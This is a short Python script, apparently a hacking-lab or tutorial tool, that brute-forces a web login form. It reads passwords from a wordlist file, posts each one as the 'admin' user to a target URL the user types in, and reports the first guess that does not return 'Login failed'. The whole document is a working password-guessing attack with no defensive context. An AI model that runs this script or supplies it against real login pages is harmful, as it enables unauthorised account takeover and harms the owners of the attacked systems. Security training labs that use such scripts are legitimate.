#!/usr/bin/python3

import requests

# Prompt user for the target URL
target_url = input("Enter the target URL: ")

data_dict = {"username": "admin", "password": "", "Login": "submit"}

with open("password.lst", "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data=data_dict)
        if "Login failed" not in response.text:
            print("[+] Got the Password ----> " + word)
            exit()

print("[+] Reached end of password list")

